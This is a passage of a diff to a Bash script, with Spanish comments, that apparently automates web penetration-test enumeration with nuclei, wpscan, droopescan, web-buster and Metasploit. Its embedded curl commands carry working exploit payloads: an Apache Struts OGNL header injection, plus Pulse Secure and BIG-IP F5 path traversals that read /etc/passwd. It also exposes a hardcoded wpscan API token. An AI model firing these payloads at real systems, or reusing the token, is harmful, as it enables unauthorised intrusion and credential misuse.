+   $proxychains curl --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null&
 
 	waitWeb 2.5
    	echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
 
    waitWeb 2.5
    echo -e "\t\t[+] Nuclei tomcat $proto_http $ip:$port"	
-   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/tomcat_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt &
+   nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/tomcat_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_tomcatNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_tomcatNuclei.txt &
 	
 	waitWeb 2.5
     echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m tomcat -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_archivosTomcat.txt &
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m tomcat -s $proto_http -q 1 $param_msg_error > logs/enumeracion/"$host"_"$port"_archivosTomcat.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"		
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webserver.txt &
 
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
-	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
+	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto_http -q 1 $param_msg_error > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
     
 	waitWeb 2.5
 	echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
     
     if [[ "$MODE" == "total" ]]; then 		
 
 		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${PROXYCHAINS} != *"s"* ]];then 
 			waitWeb 2.5
 			echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"								
-			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &			
+			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto_http -q 1 $param_msg_error >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &			
 			sleep 1;
 		fi	
 
@@ -574,7 +570,7 @@ function enumeracionTomcat () {
 			else
 				waitWeb 2.5
 			echo -e "\t\t[+] Revisando archivos jsp ($host - tomcat)"
-			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m jsp -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webarchivos.txt &
+			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m jsp -s $proto_http -q 1 $param_msg_error >> logs/vulnerabilidades/"$host"_"$port"_webarchivos.txt &
 			fi			
 		fi								
      
@@ -584,26 +580,26 @@ function enumeracionTomcat () {
 }
 
 function enumeracionSAP () {  
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3  
-   echo -e "\t\t[+] Enumerar SAP ($proto : $host : $port)"
+   echo -e "\t\t[+] Enumerar SAP ($proto_http : $host : $port)"
    
    waitWeb 2.5
-   SAP-scan -url=$proto://$host:$port > logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt &
+   SAP-scan -url=$proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt &
 
    waitWeb 2.5
    echo -e "\t\t[+] Nuclei SAP $proto_http $ip:$port"	
-   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/sap.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt &
+   nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/sap.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt &
 	
 	waitWeb 2.5
     echo -e "\t\t[+] Revisando archivos comunes de SAP ($host - SAP)"
-    $proxychains web-buster.pl -r 0 -t $host -p $port -h 5 -d / -m sap -e 'setValuesAutoCreation' -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_archivosSAP.txt & 	            
+    $proxychains web-buster.pl -r 0 -t $host -p $port -h 5 -d / -m sap -e 'setValuesAutoCreation' -s $proto_http -q 1 $param_msg_error > logs/enumeracion/"$host"_"$port"_archivosSAP.txt & 	            
 }
 
 
 function enumeracionCMS () { 
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3     
 
@@ -617,12 +613,12 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 
 
-		echo -e "\t\t[+] nuclei Drupal ("$proto"://"$host":"$port")"
-		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt &
-			
+		echo -e "\t\t[+] nuclei Drupal ("$proto_http"://"$host":"$port")"
+		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/drupal_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_drupalNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_drupalNuclei.txt &
+		# http://www.mipc.com.bo/node/9/devel/token
 		if [[  "$MODE" == "total" ]]; then
 			echo -e "\t\t[+] Revisando vulnerabilidades de drupal ($host)"
-        	$proxychains droopescan scan drupal -u  "$proto"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_droopescan.txt 2>/dev/null &
+        	$proxychains droopescan scan drupal -u  "$proto_http"://$host --output json > logs/vulnerabilidades/"$host"_"$port"_droopescan.txt 2>/dev/null &
 		fi            																																	
     fi
 
@@ -631,26 +627,26 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 
 		echo -e "\t\t[+] Revisando vulnerabilidades de Wordpress ($host)"		
-		echo -e "\t\t[+] nuclei Wordpress ("$proto"://"$host":"$port")"
-		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/wordpress_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt &
+		echo -e "\t\t[+] nuclei Wordpress ("$proto_http"://"$host":"$port")"
+		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/wordpress_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt &
 
         wpscan  --update  >/dev/null   
-        echo -e "\t\t[+] Wordpress user enumeration ("$proto"://"$host":"$port")"
-		#echo "$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto"://"$host":"$port" --format json"
-        $proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto"://"$host":"$port" --format json > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json &
-		echo -e "\t\t[+] wordpress_ghost_scanner ("$proto"://"$host":"$port")"
+        echo -e "\t\t[+] Wordpress user enumeration ("$proto_http"://"$host":"$port")"
+		#echo "$proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto_http"://"$host":"$port" --format json"
+        $proxychains wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url "$proto_http"://"$host":"$port" --format json > logs/vulnerabilidades/"$host"_"$port"_wpUsers.json &
+		echo -e "\t\t[+] wordpress_ghost_scanner ("$proto_http"://"$host":"$port")"
 		msfconsole -x "use scanner/http/wordpress_ghost_scanner;set RHOSTS $host; set RPORT $port ;run;exit" > logs/vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null &
 
-		wordpress-CVE-2022-21661.py $proto"://"$host":"$port/wp-admin/admin-ajax.php 1 > logs/vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt
+		wordpress-CVE-2022-21661.py $proto_http"://"$host":"$port/wp-admin/admin-ajax.php 1 > logs/vulnerabilidades/"$host"_"$port"_wordpressCVE~2022~21661.txt
 
-		wordpress-scan -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt &
-		xml-rpc-test -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt &
-		xml-rpc-login -url $proto"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt &
+		wordpress-scan -url $proto_http"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_wordpressPlugins.txt &
+		xml-rpc-test -url $proto_http"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt &
+		xml-rpc-login -url $proto_http"://"$host":"$port/ > logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt &
 		# https://github.com/roddux/wordpress-dos-poc/tree/master WordPress <= 5.3
 
 		if [[ "$MODE" == "total" ]]; then
 			echo -e "\t\t[+] Revisando vulnerabilidades de wordpress "
-        	$proxychains wpscan --disable-tls-checks  --random-user-agent --url "$proto"://$host/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt &			
+        	$proxychains wpscan --disable-tls-checks  --random-user-agent --url "$proto_http"://$host/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U --plugins-detection aggressive  > logs/vulnerabilidades/"$host"_"$port"_wpscan.txt &			
 			sleep 5
 			grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$host"_"$port"_wpscan.txt
 			greprc=$?
@@ -720,7 +716,7 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 								
         echo -e "\t\t[+] Revisando vulnerabilidades de Pulse Secure ($host)"        
-        $proxychains curl --max-time 10 --path-as-is -s -k "$proto://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt &
+        $proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt &
                 
     fi
     ##################################		
@@ -752,17 +748,17 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 										
         echo -e "\t\t[+] Revisando vulnerabilidades de joomla ($host)"
-        #joomscan.sh -u "$proto"://$host/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > logs/vulnerabilidades/"$host"_"$port"_joomscan.txt &	
+        #joomscan.sh -u "$proto_http"://$host/ | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > logs/vulnerabilidades/"$host"_"$port"_joomscan.txt &	
 		joomla_version.pl -host $host -port $port -path / > logs/enumeracion/"$host"_"$port"_joomla-version.txt &
         
-		#joomla-cd.rb "$proto://$host" > logs/vulnerabilidades/"$host"_"$port"_joomla-CVE-2023-23752.txt &
+		#joomla-cd.rb "$proto_http://$host" > logs/vulnerabilidades/"$host"_"$port"_joomla-CVE-2023-23752.txt &
 		echo -e "\t\t[+] Nuclei Joomla ($host)"
-		nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/joomla_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt &
+		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/joomla_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_joomlaNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_joomlaNuclei.txt &
 
 		echo -e "\t\t[+] Revisando si el registro esta habilitado"
-		status_code=`curl --max-time 10 -s -k -o /dev/null -w "%{http_code}"  "$proto://$host:$port/index.php/component/users/?view=registration"`
+		status_code=`curl --max-time 10 -s -k -o /dev/null -w "%{http_code}"  "$proto_http://$host:$port/index.php/component/users/?view=registration"`
 		if [ "$status_code" == '200' ]; then 
-			echo "$proto://$host:$port/index.php/component/users/?view=registration" > .vulnerabilidades/"$host"_"$port"_cms-registroHabilitado.txt
+			echo "$proto_http://$host:$port/index.php/component/users/?view=registration" > .vulnerabilidades/"$host"_"$port"_cms-registroHabilitado.txt
 		fi
     fi
     ###################################	
@@ -772,7 +768,7 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 										
         echo -e "\t\t[+] Enumerando WAMPSERVER ($host)"
-        $proxychains wampServer.pl -url "$proto"://$host/ > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
+        $proxychains wampServer.pl -url "$proto_http"://$host/ > .enumeracion/"$host"_"$port"_WAMPSERVER.txt &
     fi
     ###################################	
 
@@ -782,7 +778,7 @@ function enumeracionCMS () {
     greprc=$?
     if [[ $greprc -eq 0 ]];then 		
         echo -e "\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($host)"        
-        $proxychains curl --max-time 10 --path-as-is -s -k "$proto://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt &                
+        $proxychains curl --max-time 10 --path-as-is -s -k "$proto_http://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt &                
     fi
     ###################################
    	
@@ -791,11 +787,11 @@ function enumeracionCMS () {
 
 function testSSL ()
 {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3 
 
-    echo -e "\t\t[+] TEST SSL ($proto : $host : $port)"	
+    echo -e "\t\t[+] TEST SSL ($proto_http : $host : $port)"	
 	waitWeb 2.5
     #######  hearbleed ######						
     echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
@@ -817,11 +813,11 @@ function testSSL ()
 
 function enumeracionIOT ()
 {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3  
    
-#   if [ "$VERBOSE" == 's' ]; then  echo -e "\t\t[+]Params $proto : $host : $port "; fi
+#   if [ "$VERBOSE" == 's' ]; then  echo -e "\t\t[+]Params $proto_http : $host : $port "; fi
 	egrep -iq "Windows Device Portal" .enumeracion/"$host"_"$port"_webData.txt 
 	greprc=$?
 	if [[ $greprc -eq 0 && ! -f .enumeracion/"$host"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes				
@@ -847,16 +843,16 @@ function enumeracionIOT ()
 
 function cloneSite ()
 {
-   proto=$1
+   proto_http=$1
    host=$2
    port=$3  
-   echo -e "\t\t[+] Clone site ($proto : $host : $port)"	
+   echo -e "\t\t[+] Clone site ($proto_http : $host : $port)"	
 
     #######  clone site  ####### 			
-    cd webClone/$host/
+    cd webTrack/$host/
         echo -e "\t\t[+] Clonando sitio ($host) del DOMINIO $DOMINIO tardara un rato"	
 		pwd
-        wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto://$host 2>/dev/null
+        wget -mirror --convert-links --adjust-extension --no-parent -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp,ttf,svg,woff2,css,ico --exclude-directories /calendar,/noticias,/blog,/xnoticias,/article,/component,/index.php --timeout=5 --tries=1 --adjust-extension  --level=3 --no-check-certificate $proto_http://$host 2>/dev/null
         rm index.html.orig 2>/dev/null
 
         echo ""
@@ -1034,7 +1030,7 @@ for line in $(cat $TARGETS); do
 		DOMINIO_INTERNO_NMAP=`cat logs/enumeracion/"$ip"_"$port"_domainNmap.txt 2>/dev/null`
 		DOMINIO_INTERNO_WEBDATA=`cat logs/enumeracion/"$ip"_web_domainWebData.txt 2>/dev/null`
 
-		if [[  $DOMINIOS_SSL =~ ^[0-9]+$ || $DOMINIOS_SSL == *"_"* ]] ; then #si contiene solo numeros o el caracter _
+		if [[  $DOMINIOS_SSL =~ ^[0-9]+$ || $DOMINIOS_SSL == *"_"* || $DOMINIOS_SSL == *"*"* ]] ; then #si contiene solo numeros, el caracter '_' o el caracter * no adicionar
 			DOMINIOS_INTERNOS_TODOS="$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
 		else
 			DOMINIOS_INTERNOS_TODOS="$DOMINIOS_SSL"$'\n'"$DOMINIO_INTERNO_NMAP"$'\n'"$DOMINIO_INTERNO_WEBDATA"
@@ -1131,36 +1127,57 @@ for line in $(cat $TARGETS); do
 	fi
 
 	
-	if [ "$VERBOSE" == 's' ]; then  echo -e "LISTA HOST: \n $lista_hosts"; fi #lista de todos los dominios + ip			
+	if [ "$VERBOSE" == 's' ]; then  echo -e "LISTA HOST:$lista_hosts"; fi #lista de todos los dominios + ip			
 	for host in $lista_hosts; do
 		#Verificar que no siempre devuelve 200 OK
 		status_code_nonexist=`getStatus -url $proto_http://$host:$port/nonexisten45s/`
+		webScaneado=0
+
+		if [[  "$status_code_nonexist" == *":"*  ]]; then # devuelve 200 OK pero se detecto un mensaje de error 404
+			msg_error_404=`echo $status_code_nonexist | cut -d ':' -f2`
+			msg_error_404=$(echo "$msg_error_404" | tr ' ' '~') # 404 Not Found -> 404~Not~Found
+		fi
+
+		only_status=`echo $status_code_nonexist | cut -d ':' -f1`
 		
-		if [ "$status_code_nonexist" == '200' ]; then 
+		if [ ! -z "$msg_error_404" ];then
+			param_msg_error="-e $msg_error_404" #parametro para web-buster
+		fi
+		
+		if [[ "$only_status" == '200' &&  -z "$msg_error_404" ]]; then 
 			echo -n "~Always200-OK" >> .enumeracion/"$host"_"$port"_webData.txt
 			sed -i ':a;N;$!ba;s/\n//g' .enumeracion/"$host"_"$port"_webData.txt #borrar salto de linea
 		fi
 		
-
-		if [ "$VERBOSE" == 's' ]; then  echo -e "\t[+] $proto_http://$host:$port/nonexisten45s/ status_code $status_code_nonexist "; fi
 		
-		if [[  ${host} != *"localhost"*  && ${host} != *"cpanel."*  && ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"ftp."* && ${host} != *"webdisk."* && ${host} != *"webmail."* &&  ${host} != *"whm."* && "$status_code_nonexist" == *"40"*  ]];then 
+		if [ ! -f "logs/enumeracion/"$host"_"$port"_webData.txt" ];then
+			$proxychains webData.pl -t $host -p $port -s $proto_http -e todo -d / -l logs/enumeracion/"$host"_"$port"_webData.txt -r 1 | grep -vi 'read timeout|Connection refused|Connection timed out' > .enumeracion/"$host"_"$port"_webData.txt 2>/dev/null 
+		fi
 
-			mkdir -p webClone/$host 2>/dev/null
+		if [ "$VERBOSE" == 's' ]; then  echo -e "\t[+] $proto_http://$host:$port/nonexisten45s/ status_code $status_code_nonexist "; fi		
+		if [[  ${host} != *"localhost"*  && ${host} != *"cpanel."*  && ${host} != *"cpcalendars."* && ${host} != *"cpcontacts."*  && ${host} != *"ftp."* && ${host} != *"webdisk."* && ${host} != *"webmail."* &&  ${host} != *"whm."* && "$status_code_nonexist" == *"40"*  ]];then 
+			webScaneado=1
+			mkdir -p webTrack/$host 2>/dev/null			
 			mkdir -p archivos/$host 2>/dev/null
-			touch webClone/$host/checksumsEscaneados.txt	
-			echo -e "\t[+] Navegacion forzada en host: $proto_http://$host:$port"									
-									
-			#Borrar lineas que cambian en cada peticion						
-			removeLinks.py logs/enumeracion/"$host"_"$port"_webData.txt | egrep -vi 'date|token|hidden' > webClone/$host/"$proto_http"-"$host"-"$port".html
-						
-			if [[ ! -f webClone/$host/"$proto_http"-"$host"-"$port".html ]];then
-				echo "no disponible" > webClone/$host/"$proto_http"-"$host"-"$port".html 
+			touch webTrack/$host/checksumsEscaneados.txt
+
+			if [[ "$MODE" == "total" ]]; then
+				echo -e "\t[+] Clonando: $proto_http://$host:$port"
+				httrack $proto_http://$host:$port -O webclone				
 			fi
 
-			checksumline=`md5sum webClone/$host/"$proto_http"-"$host"-"$port".html` 							
+			echo -e "\t[+] Navegacion forzada en host: $proto_http://$host:$port"
+									
+			#Borrar lineas que cambian en cada peticion						
+			removeLinks.py logs/enumeracion/"$host"_"$port"_webData.txt | egrep -vi 'date|token|hidden' > webTrack/$host/"$proto_http"-"$host"-"$port".html
+						
+			if [[ ! -f webTrack/$host/"$proto_http"-"$host"-"$port".html ]];then
+				echo "no disponible" > webTrack/$host/"$proto_http"-"$host"-"$port".html 
+			fi
+
+			checksumline=`md5sum webTrack/$host/"$proto_http"-"$host"-"$port".html` 							
 			md5=`echo $checksumline | awk {'print $1'}` 													
-			egrep -iq $md5 webClone/$host/checksumsEscaneados.txt
+			egrep -iq $md5 webTrack/$host/checksumsEscaneados.txt
 			noEscaneado=$?
 
 			if [[ $noEscaneado -eq 0 ]];then 
@@ -1168,20 +1185,29 @@ for line in $(cat $TARGETS); do
 				sed -i ':a;N;$!ba;s/\n//g' .enumeracion/"$host"_"$port"_webData.txt #borrar salto de linea
 			fi
 
-			egrep -iq "no Route matched with those values" webClone/$host/"$proto_http"-"$host"-"$port".html
+			egrep -iq "no Route matched with those values" webTrack/$host/"$proto_http"-"$host"-"$port".html
 			greprc=$?
 			if [[ $greprc -eq 0  ]];then 
 				noEscaneado=1
 			fi	
-			
-			egrep -qi "Dominio identificado|301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" .enumeracion/"$host"_"$port"_webData.txt
+						
+			grep "Dominio identificado" .enumeracion/"$host"_"$port"_webData.txt
+			greprc=$? 	# 1= no coincide 		
+			result=$(formato_ip "$host")
+			if [[ $result -eq 1 && $greprc -eq 0 ]] ;then
+				ip2domainRedirect=1
+			else
+				ip2domainRedirect=0
+			fi
+
+			egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" .enumeracion/"$host"_"$port"_webData.txt
 			hostOK=$?
 			
 			# 1= no coincide (no redirecciona a otro dominio o es error de proxy)							
-			if [ "$VERBOSE" == 's' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK "; fi
+			if [ "$VERBOSE" == 's' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK ip2domainRedirect $ip2domainRedirect"; fi
 			
-			if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
-				echo $checksumline >> webClone/$host/checksumsEscaneados.txt	
+			if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 && $ip2domainRedirect -eq 0 ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
+				echo $checksumline >> webTrack/$host/checksumsEscaneados.txt	
 
 				#######  If not firewall/IoT ######
 				egrep -qi "Fortinet|Cisco|RouterOS|Juniper" .enumeracion/"$host"_"$port"_webData.txt
@@ -1196,8 +1222,8 @@ for line in $(cat $TARGETS); do
 
 						# Headers seguros
 						echo -e "\t[+] Revisar headers seguros ($proto_http://$host:$port) "
-						shcheck.py -d --colours=none $url $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt  2>/dev/null
-        				grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt | egrep 'X-Content-Type|Strict-Transport|Referrer-Policy|X-Frame-Options' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt
+						shcheck.py -d --colours=none --caching --use-get-method $proto_http://$host:$port  > logs/vulnerabilidades/"$host"_"$port"_CS-49.txt  2>/dev/null
+        				grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_CS-49.txt | egrep 'X-Content-Type|Strict-Transport|Referrer-Policy|X-Frame-Options' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port"_CS-49.txt						
 						
 						#source resource integrity
 						echo -e "\t[+] source resource integrity check ($proto_http://$host:$port) "
@@ -1216,11 +1242,7 @@ for line in $(cat $TARGETS); do
 						# _blank targets with no "rel nofollow no referrer"
 						echo -e "\t[+] _blank targets check ($proto_http://$host:$port)  " 
 						check_blank_target $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_check-blank-target.txt 
-						grep -iv error logs/vulnerabilidades/"$host"_"$port"_check-blank-target.txt > .vulnerabilidades/"$host"_"$port"_check-blank-target.txt 
-
-						echo -e "\t[+] multiviews check ($proto_http://$host:$port)  " 
-						multiviews -url=$proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 
-						grep vulnerable logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt > .vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 
+						grep -iv error logs/vulnerabilidades/"$host"_"$port"_check-blank-target.txt > .vulnerabilidades/"$host"_"$port"_check-blank-target.txt 						
 
 						egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
 						greprc=$?						
@@ -1228,14 +1250,21 @@ for line in $(cat $TARGETS); do
 							
 							##########################################
 							echo -e "\t[+] Crawling ($proto_http://$host:$port )"							
-							katana -u $proto_http://$host:$port -no-scope -output logs/enumeracion/"$host"_"$port"_webCrawled2.txt >/dev/null 2>/dev/null
-							sort logs/enumeracion/"$host"_"$port"_webCrawled2.txt | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
+							katana -u $proto_http://$host:$port -no-scope -no-color -silent -output logs/enumeracion/"$host"_"$port"_webCrawledKatana.txt >/dev/null 2>/dev/null
+							blackwidow -u $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt
+							head -30 logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt > logs/vulnerabilidades/"$host"_"$port"_CS-01.txt
+
+							sort logs/enumeracion/"$host"_"$port"_webCrawledKatana.txt | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
+							grep Dynamic logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt| awk {'print $5'} | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
+							grep -v Dynamic logs/enumeracion/"$host"_"$port"_webCrawledBlackwidow.txt | uniq >> logs/enumeracion/"$host"_"$port"_webCrawled.txt
+
